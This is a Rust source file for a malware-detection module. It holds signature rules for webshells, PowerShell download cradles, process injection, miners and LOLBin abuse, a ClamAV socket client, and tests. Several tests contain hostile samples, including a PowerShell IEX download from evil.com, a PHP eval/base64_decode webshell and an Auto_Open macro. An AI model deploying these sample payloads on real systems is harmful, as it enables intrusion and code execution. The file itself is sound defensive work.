//! Dynamic analyzers — concrete implementations of [`DynamicAnalyzer`]
//!
//! Ships two ready-to-use analyzers://!
//! 1. [`YaraSignatureAnalyzer`] — Pattern-based malware detection using
//! Aho-Corasick multi-pattern matching against YARA-like rules compiled
//! at initialization time. No external dependency required.
//!
//! 2. [`ClamAvSocketAnalyzer`] — Integration point for ClamAV via its Unix
//! socket protocol (`INSTREAM`). Requires a running ClamAV daemon.
//!
//! Both implement [`DynamicAnalyzer`] and can be provided to
//! [`SandboxEngine::with_dynamic_analyzer`].

use crate::engine::{DynamicAnalysisFinding, DynamicAnalyzer, DynamicDecision};
use aho_corasick::AhoCorasick;
use std::sync::OnceLock;

// ─── YARA-like Signature Analyzer ────────────────────────────────────────────

/// A malware indicator rule used by [`YaraSignatureAnalyzer`].
#[derive(Debug, Clone)]
pub struct MalwareRule {
/// Rule identifier (e.g., "RULE_EICAR_TEST")
    pub id: String,
/// Human-readable description
    pub description: String,
/// Binary patterns — ALL must be present for a match (AND logic)
    pub patterns: Vec<Vec<u8>>,
/// Risk contribution when the rule fires
    pub risk: f64,
/// Decision to recommend
    pub decision: DynamicDecision,
}

/// Compiled rule set for efficient multi-pattern scanning.
struct CompiledRuleSet {
/// Aho-Corasick automaton over all patterns from all rules
    automaton: AhoCorasick,
/// Maps pattern index → (rule_index, pattern_index_within_rule)
    pattern_map: Vec<(usize, usize)>,
/// Original rules
    rules: Vec<MalwareRule>,
}

/// Pattern-based malware detection using YARA-like signature rules.
/// Compiles all rule patterns into a single Aho-Corasick automaton for O(n)
/// scanning. A rule fires when **all** of its patterns are found in the input
/// (AND logic, matching YARA's `all of them` semantics).
/// ## Built-in Rules
/// The default instance includes rules for:/// - EICAR test string
/// - PE executable with suspicious imports (VirtualAlloc + CreateRemoteThread)
/// - PowerShell download cradles
/// - Macro auto-execution triggers
/// - Ransomware file extension patterns
/// - Shellcode NOP sleds
/// - Suspicious PDF JavaScript
/// - Cobalt Strike beacon indicators
/// - WebShell detection patterns
/// - Cryptocurrency miner indicators
pub struct YaraSignatureAnalyzer {
    compiled: CompiledRuleSet,
}

/// Get the default built-in malware rules.
fn builtin_malware_rules() -> Vec<MalwareRule> {
    vec![
// ── Test / Canary ──
        MalwareRule {
            id: "RULE_EICAR_TEST".into(),
            description: "EICAR anti-malware test string detected".into(),
            patterns: vec![
                b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR".to_vec(),
            ],
            risk: 10.0,
            decision: DynamicDecision::Reject,
        },
// ── PE with suspicious API imports ──
        MalwareRule {
            id: "RULE_PE_SUSPICIOUS_IMPORTS".into(),
            description: "PE executable with process injection API imports".into(),
            patterns: vec![
                b"VirtualAlloc".to_vec(),
                b"CreateRemoteThread".to_vec(),
            ],
            risk: 8.0,
            decision: DynamicDecision::Reject,
        },
        MalwareRule {
            id: "RULE_PE_PROCESS_HOLLOWING".into(),
            description: "PE executable with process hollowing indicators".into(),
            patterns: vec![
                b"NtUnmapViewOfSection".to_vec(),
                b"WriteProcessMemory".to_vec(),
            ],
            risk: 9.0,
            decision: DynamicDecision::Reject,
        },
// ── PowerShell cradles ──
        MalwareRule {
            id: "RULE_POWERSHELL_DOWNLOAD".into(),
            description: "PowerShell download cradle detected".into(),
            patterns: vec![
                b"powershell".to_vec(),
                b"DownloadString".to_vec(),
            ],
            risk: 8.0,
            decision: DynamicDecision::Reject,
        },
        MalwareRule {
            id: "RULE_POWERSHELL_ENCODED".into(),
            description: "PowerShell encoded command execution".into(),
            patterns: vec![
                b"powershell".to_vec(),
                b"-EncodedCommand".to_vec(),
            ],
            risk: 8.0,
            decision: DynamicDecision::Reject,
        },
        MalwareRule {
            id: "RULE_POWERSHELL_BYPASS".into(),
            description: "PowerShell execution policy bypass".into(),
            patterns: vec![
                b"powershell".to_vec(),
                b"-ExecutionPolicy".to_vec(),
                b"Bypass".to_vec(),
            ],
            risk: 7.0,
            decision: DynamicDecision::Flag,
        },
// ── Macro auto-execution ──
        MalwareRule {
            id: "RULE_VBA_AUTOOPEN".into(),
            description: "VBA macro with AutoOpen/AutoExec trigger".into(),
            patterns: vec![
                b"Attribute VB_".to_vec(),
                b"Auto_Open".to_vec(),
            ],
            risk: 7.0,
            decision: DynamicDecision::Flag,
        },
        MalwareRule {
            id: "RULE_VBA_SHELL_EXEC".into(),
            description: "VBA macro with Shell execution".into(),
            patterns: vec![
                b"Attribute VB_".to_vec(),
                b"Shell".to_vec(),
            ],
            risk: 8.0,
            decision: DynamicDecision::Reject,
        },
        MalwareRule {
            id: "RULE_VBA_WSCRIPT".into(),
            description: "VBA macro using WScript.Shell".into(),
            patterns: vec![
                b"WScript.Shell".to_vec(),
            ],
            risk: 7.0,
            decision: DynamicDecision::Flag,
        },
// ── Ransomware indicators ──
        MalwareRule {
            id: "RULE_RANSOM_NOTE".into(),
            description: "Ransomware payment demand indicators".into(),
            patterns: vec![
                b"YOUR FILES HAVE BEEN ENCRYPTED".to_vec(),
            ],
            risk: 9.0,
            decision: DynamicDecision::Reject,
        },
        MalwareRule {
            id: "RULE_RANSOM_BITCOIN".into(),
            description: "Ransomware Bitcoin payment demand".into(),
            patterns: vec![
                b"bitcoin".to_vec(),
                b"decrypt".to_vec(),
                b"payment".to_vec(),
            ],
            risk: 7.0,
            decision: DynamicDecision::Flag,
        },
// ── Shellcode detection ──
        MalwareRule {
            id: "RULE_SHELLCODE_NOP_SLED".into(),
            description: "NOP sled shellcode pattern".into(),
            patterns: vec![
                b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90".to_vec(),
            ],
            risk: 9.0,
            decision: DynamicDecision::Reject,
        },
        MalwareRule {
            id: "RULE_SHELLCODE_COMMON_STUB".into(),
            description: "Common shellcode stub (egg hunter)".into(),
            patterns: vec![
                b"\xeb\xfe".to_vec(), // infinite loop (breakpoint)
            ],
            risk: 6.0,
            decision: DynamicDecision::Flag,
        },
// ── PDF malware ──
        MalwareRule {
            id: "RULE_PDF_JS_LAUNCH".into(),
            description: "PDF with JavaScript and Launch action (dropper)".into(),
            patterns: vec![
                b"/JavaScript".to_vec(),
                b"/Launch".to_vec(),
            ],
            risk: 9.0,
            decision: DynamicDecision::Reject,
        },
        MalwareRule {
            id: "RULE_PDF_EMBEDDED_EXE".into(),
            description: "PDF with embedded executable content".into(),
            patterns: vec![
                b"%PDF".to_vec(),
                b"/EmbeddedFile".to_vec(),
                b"MZ".to_vec(),
            ],
            risk: 9.0,
            decision: DynamicDecision::Reject,
        },
// ── C2 / Beacon ──
        MalwareRule {
            id: "RULE_COBALT_STRIKE_BEACON".into(),
            description: "Cobalt Strike beacon configuration indicators".into(),
            patterns: vec![
                b"\x00\x01\x00\x01\x00\x02".to_vec(), // CS config header
            ],
            risk: 9.0,
            decision: DynamicDecision::Reject,
        },
// ── WebShell ──
        MalwareRule {
            id: "RULE_PHP_WEBSHELL".into(),
            description: "PHP webshell indicators (eval + base64_decode)".into(),
            patterns: vec![
                b"eval(".to_vec(),
                b"base64_decode".to_vec(),
            ],
            risk: 8.0,
            decision: DynamicDecision::Reject,
        },
        MalwareRule {
            id: "RULE_JSP_WEBSHELL".into(),
            description: "JSP webshell indicators (Runtime.exec)".into(),
            patterns: vec![
                b"Runtime.getRuntime().exec".to_vec(),
            ],
            risk: 8.0,
            decision: DynamicDecision::Reject,
        },
// ── Crypto miner ──
        MalwareRule {
            id: "RULE_CRYPTO_MINER".into(),
            description: "Cryptocurrency miner indicators".into(),
            patterns: vec![
                b"stratum+tcp://".to_vec(),
            ],
            risk: 7.0,
            decision: DynamicDecision::Reject,
        },
        MalwareRule {
            id: "RULE_CRYPTO_MINER_XMR".into(),
            description: "XMRig miner configuration".into(),
            patterns: vec![
                b"xmrig".to_vec(),
                b"pool".to_vec(),
            ],
            risk: 7.0,
            decision: DynamicDecision::Flag,
        },
// ── Exploit kit ──
        MalwareRule {
            id: "RULE_RTF_OLE_EXPLOIT".into(),
            description: "RTF document with embedded OLE exploit object".into(),
            patterns: vec![
                b"{\\rtf".to_vec(),
                b"\\objdata".to_vec(),
            ],
            risk: 8.0,
            decision: DynamicDecision::Reject,
        },
// ── Batch/CMD malware ──
        MalwareRule {
            id: "RULE_CMD_CERTUTIL_DECODE".into(),
            description: "Certutil-based payload decode (LOLBin abuse)".into(),
            patterns: vec![
                b"certutil".to_vec(),
                b"-decode".to_vec(),
            ],
            risk: 8.0,
            decision: DynamicDecision::Reject,
        },
        MalwareRule {
            id: "RULE_CMD_BITSADMIN".into(),
            description: "BITSAdmin download (LOLBin abuse)".into(),
            patterns: vec![
                b"bitsadmin".to_vec(),
                b"/transfer".to_vec(),
            ],
            risk: 7.0,
            decision: DynamicDecision::Flag,
        },
    ]
}

impl YaraSignatureAnalyzer {
/// Create analyzer with built-in malware rules.
    pub fn new() -> Option<Self> {
        Self::with_rules(builtin_malware_rules())
    }

/// Create analyzer with custom rules.
    pub fn with_rules(rules: Vec<MalwareRule>) -> Option<Self> {
        if rules.is_empty() {
            let empty_patterns: Vec<&[u8]> = Vec::new();
            return Some(Self {
                compiled: CompiledRuleSet {
                    automaton: AhoCorasick::builder().build(&empty_patterns).ok()?,
                    pattern_map: Vec::new(),
                    rules,
                },
            });
        }

        let mut all_patterns: Vec<Vec<u8>> = Vec::new();
        let mut pattern_map: Vec<(usize, usize)> = Vec::new();

        for (rule_idx, rule) in rules.iter().enumerate() {
            for (pat_idx, pat) in rule.patterns.iter().enumerate() {
                all_patterns.push(pat.clone());
                pattern_map.push((rule_idx, pat_idx));
            }
        }

        let automaton = AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .build(&all_patterns)
            .ok()?;

        Some(Self {
            compiled: CompiledRuleSet {
                automaton,
                pattern_map,
                rules,
            },
        })
    }

/// Number of loaded rules.
    pub fn rule_count(&self) -> usize {
        self.compiled.rules.len()
    }
}

impl Default for YaraSignatureAnalyzer {
    fn default() -> Self {
        Self::new().expect("builtin rules should compile")
    }
}

impl DynamicAnalyzer for YaraSignatureAnalyzer {
    fn analyze(&self, data: &[u8], _filename: Option<&str>) -> Option<DynamicAnalysisFinding> {
        if self.compiled.rules.is_empty() {
            return None;
        }

// Track which patterns matched for each rule
        let _rule_count = self.compiled.rules.len();
        let mut rule_pattern_hits: Vec<Vec<bool>> = self
            .compiled
            .rules
            .iter()
            .map(|r| vec![false; r.patterns.len()])
            .collect();

        for mat in self.compiled.automaton.find_iter(data) {
            let (rule_idx, pat_idx) = self.compiled.pattern_map[mat.pattern().as_usize()];
            rule_pattern_hits[rule_idx][pat_idx] = true;
        }

// Find the highest-risk fully-matched rule
        let mut best_finding: Option<DynamicAnalysisFinding> = None;

        for (idx, rule) in self.compiled.rules.iter().enumerate() {
            let all_matched = rule_pattern_hits[idx].iter().all(|&hit| hit);
            if all_matched {
                let dominated = best_finding
                    .as_ref()
                    .map(|f| rule.risk <= f.risk)
                    .unwrap_or(false);
                if !dominated {
                    best_finding = Some(DynamicAnalysisFinding {
                        id: rule.id.clone(),
                        description: rule.description.clone(),
                        risk: rule.risk,
                        decision: rule.decision,
                    });
                }
            }
        }

        best_finding
    }
}

// ─── ClamAV Socket Analyzer ─────────────────────────────────────────────────

/// ClamAV integration via Unix socket (`clamd` INSTREAM protocol).
/// Sends attachment data to a running ClamAV daemon and interprets the
/// response. Requires `clamd` listening on the configured socket path.
/// ## Protocol
/// 1. Send `zINSTREAM\0`
/// 2. For each chunk:send 4-byte big-endian length + data
/// 3. Send 4-byte zero length to signal end
/// 4. Read response line:`stream:OK` or `stream:<virus> FOUND`
/// ## Known limitations
/// - **Blocking I/O**:Uses `std::net::UnixStream` synchronously. For async
/// use, wrap in `tokio::task::spawn_blocking`.
/// - **No connection pooling**:Opens a new socket per scan. For high throughput,
/// implement a connection pool or use ClamAV's milter interface.
pub struct ClamAvSocketAnalyzer {
/// Path to the ClamAV Unix socket (e.g., `/var/run/clamav/clamd.ctl`)
    socket_path: String,
/// Maximum data size to send (default:25MB)
    max_scan_size: usize,
}

impl ClamAvSocketAnalyzer {
/// Create a new ClamAV analyzer with the given socket path.
    pub fn new(socket_path: String) -> Self {
        Self {
            socket_path,
            max_scan_size: 25 * 1024 * 1024,
        }
    }

/// Create with a custom max scan size.
    pub fn with_max_size(socket_path: String, max_scan_size: usize) -> Self {
        Self {
            socket_path,
            max_scan_size,
        }
    }
}

impl DynamicAnalyzer for ClamAvSocketAnalyzer {
    fn analyze(&self, data: &[u8], filename: Option<&str>) -> Option<DynamicAnalysisFinding> {
        use std::io::{Read, Write};

        if data.len() > self.max_scan_size {
            return Some(DynamicAnalysisFinding {
                id: "CLAMAV_SIZE_EXCEEDED".into(),
                description: format!(
                    "File size {} exceeds ClamAV scan limit {}",
                    data.len(),
                    self.max_scan_size
                ),
                risk: 3.0,
                decision: DynamicDecision::Flag,
            });
        }

// Attempt connection to ClamAV socket
        #[cfg(unix)]
        {
            let stream = match std::os::unix::net::UnixStream::connect(&self.socket_path) {
                Ok(s) => s,
                Err(e) => {
                    tracing::warn!(
                        socket = %self.socket_path,
                        error = %e,
                        "ClamAV socket connection failed — skipping dynamic analysis"
                    );
                    return None;
                }
            };

// Set a reasonable timeout
            let timeout = std::time::Duration::from_secs(30);
            let _ = stream.set_read_timeout(Some(timeout));
            let _ = stream.set_write_timeout(Some(timeout));

            let mut stream = std::io::BufWriter::new(stream);

// Send INSTREAM command
            if stream.write_all(b"zINSTREAM\0").is_err() {
                return None;
            }

// Send data in 8KB chunks
            let chunk_size = 8192;
            for chunk in data.chunks(chunk_size) {
                let len = (chunk.len() as u32).to_be_bytes();
                if stream.write_all(&len).is_err() || stream.write_all(chunk).is_err() {
                    return None;
                }
            }

// Send zero-length terminator
            if stream.write_all(&[0, 0, 0, 0]).is_err() {
                return None;
            }

            if stream.flush().is_err() {
                return None;
            }

// Read response
            let mut inner = stream.into_inner().ok()?;
            let mut response = String::new();
            if inner.read_to_string(&mut response).is_err() {
                return None;
            }

            let response = response.trim();

            if response.contains("FOUND") {
// Extract virus name:"stream:Eicar-Signature FOUND"
                let virus_name = response
                    .strip_prefix("stream: ")
                    .and_then(|s| s.strip_suffix(" FOUND"))
                    .unwrap_or("unknown");

                return Some(DynamicAnalysisFinding {
                    id: format!("CLAMAV_{}", virus_name.replace(['-', '.', ' '], "_").to_uppercase()),
                    description: format!(
                        "ClamAV detected: {} (file: {})",
                        virus_name,
                        filename.unwrap_or("<unnamed>")
                    ),
                    risk: 10.0,
                    decision: DynamicDecision::Reject,
                });
            }

            if response.contains("OK") {
                return None; // Clean
            }

// Unexpected response
            tracing::warn!(
                response = %response,
                "Unexpected ClamAV response"
            );
        }

        None
    }
}

// ─── Global default analyzer ─────────────────────────────────────────────────

/// Get the global default `YaraSignatureAnalyzer` (singleton).
pub fn default_dynamic_analyzer() -> &'static YaraSignatureAnalyzer {
    static INSTANCE: OnceLock<YaraSignatureAnalyzer> = OnceLock::new();
    INSTANCE.get_or_init(YaraSignatureAnalyzer::default)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_yara_eicar_detection() {
        let analyzer = YaraSignatureAnalyzer::default();
        let eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
        let finding = analyzer.analyze(eicar, Some("eicar.com"));
        assert!(finding.is_some(), "EICAR should be detected");
        let f = finding.expect("finding");
        assert_eq!(f.id, "RULE_EICAR_TEST");
        assert_eq!(f.decision, DynamicDecision::Reject);
    }

    #[test]
    fn test_yara_clean_file() {
        let analyzer = YaraSignatureAnalyzer::default();
        let clean = b"Hello, this is a perfectly normal text file.";
        let finding = analyzer.analyze(clean, Some("readme.txt"));
        assert!(finding.is_none(), "Clean file should not trigger");
    }

    #[test]
    fn test_yara_pe_suspicious() {
        let analyzer = YaraSignatureAnalyzer::default();
        let mut pe = b"MZ\x90\x00".to_vec();
        pe.extend_from_slice(b"..lots of stuff..VirtualAlloc..more..CreateRemoteThread..");
        let finding = analyzer.analyze(&pe, Some("malware.dll"));
        assert!(finding.is_some(), "PE with suspicious imports should be detected");
        let f = finding.expect("finding");
        assert_eq!(f.id, "RULE_PE_SUSPICIOUS_IMPORTS");
    }

    #[test]
    fn test_yara_powershell_download() {
        let analyzer = YaraSignatureAnalyzer::default();
        let ps = b"powershell.exe -NoP -W Hidden IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')";
        let finding = analyzer.analyze(ps, Some("update.ps1"));
        assert!(finding.is_some());
        let f = finding.expect("finding");
        assert_eq!(f.id, "RULE_POWERSHELL_DOWNLOAD");
    }

    #[test]
    fn test_yara_nop_sled() {
        let analyzer = YaraSignatureAnalyzer::default();
        let mut payload = vec![0x41; 100]; // AAAA...
        payload.extend_from_slice(&[0x90; 20]); // NOP sled
        payload.extend_from_slice(b"\xcc\xcc");
        let finding = analyzer.analyze(&payload, None);
        assert!(finding.is_some());
        let f = finding.expect("finding");
        assert_eq!(f.id, "RULE_SHELLCODE_NOP_SLED");
    }

    #[test]
    fn test_yara_pdf_js_launch() {
        let analyzer = YaraSignatureAnalyzer::default();
        let pdf = b"%PDF-1.4\n1 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert(1)) >>\n/Launch /URI http://evil.com";
        let finding = analyzer.analyze(pdf, Some("invoice.pdf"));
        assert!(finding.is_some());
        let f = finding.expect("finding");
        assert_eq!(f.id, "RULE_PDF_JS_LAUNCH");
    }

    #[test]
    fn test_yara_vba_autoopen() {
        let analyzer = YaraSignatureAnalyzer::default();
        let vba = b"Attribute VB_Name = \"Module1\"\nSub Auto_Open()\n  Shell \"cmd.exe /c calc\"\nEnd Sub";
        let finding = analyzer.analyze(vba, Some("macro.vba"));
        assert!(finding.is_some());
// Should match the highest-risk rule among matching rules
        let f = finding.expect("finding");
        assert!(f.risk >= 7.0);
    }

    #[test]
    fn test_yara_requires_all_patterns() {
        let analyzer = YaraSignatureAnalyzer::default();
// Only one of two patterns for PE_SUSPICIOUS_IMPORTS
        let partial = b"VirtualAlloc is used in this documentation text";
        let finding = analyzer.analyze(partial, Some("readme.txt"));
// Should NOT match because CreateRemoteThread is missing
        assert!(finding.is_none(), "Partial pattern match should not trigger rule");
    }

    #[test]
    fn test_yara_ransomware_detection() {
        let analyzer = YaraSignatureAnalyzer::default();
        let ransom = b"YOUR FILES HAVE BEEN ENCRYPTED. Send 0.5 bitcoin to recover.";
        let finding = analyzer.analyze(ransom, Some("README.txt"));
        assert!(finding.is_some());
        let f = finding.expect("finding");
        assert_eq!(f.id, "RULE_RANSOM_NOTE");
    }

    #[test]
    fn test_yara_crypto_miner() {
        let analyzer = YaraSignatureAnalyzer::default();
        let miner = b"{ \"url\": \"stratum+tcp://pool.minexmr.com:4444\" }";
        let finding = analyzer.analyze(miner, Some("config.json"));
        assert!(finding.is_some());
        let f = finding.expect("finding");
        assert_eq!(f.id, "RULE_CRYPTO_MINER");
    }

    #[test]
    fn test_yara_webshell() {
        let analyzer = YaraSignatureAnalyzer::default();
        let webshell = b"<?php eval(base64_decode($_POST['cmd'])); ?>";
        let finding = analyzer.analyze(webshell, Some("shell.php"));
        assert!(finding.is_some());
        let f = finding.expect("finding");
        assert_eq!(f.id, "RULE_PHP_WEBSHELL");
    }

    #[test]
    fn test_yara_custom_rules() {
        let rules = vec![MalwareRule {
            id: "CUSTOM_RULE".into(),
            description: "Custom test rule".into(),
            patterns: vec![b"MAGIC_PATTERN".to_vec()],
            risk: 5.0,
            decision: DynamicDecision::Flag,
        }];
        let analyzer = YaraSignatureAnalyzer::with_rules(rules).expect("should compile");
        let data = b"This contains the MAGIC_PATTERN string";
        let finding = analyzer.analyze(data, None);
        assert!(finding.is_some());
        let f = finding.expect("finding");
        assert_eq!(f.id, "CUSTOM_RULE");
        assert_eq!(f.decision, DynamicDecision::Flag);
    }

    #[test]
    fn test_default_analyzer_singleton() {
        let a = default_dynamic_analyzer();
        let b = default_dynamic_analyzer();
        assert!(std::ptr::eq(a, b), "Should return same instance");
        assert!(a.rule_count() > 15, "Should have many built-in rules");
    }

    #[test]
    fn test_clamav_oversize_flagged() {
        let analyzer = ClamAvSocketAnalyzer::with_max_size("/dev/null".into(), 100);
        let data = vec![0u8; 200];
        let finding = analyzer.analyze(&data, Some("big.bin"));
        assert!(finding.is_some());
        let f = finding.expect("finding");
        assert_eq!(f.id, "CLAMAV_SIZE_EXCEEDED");
    }
}
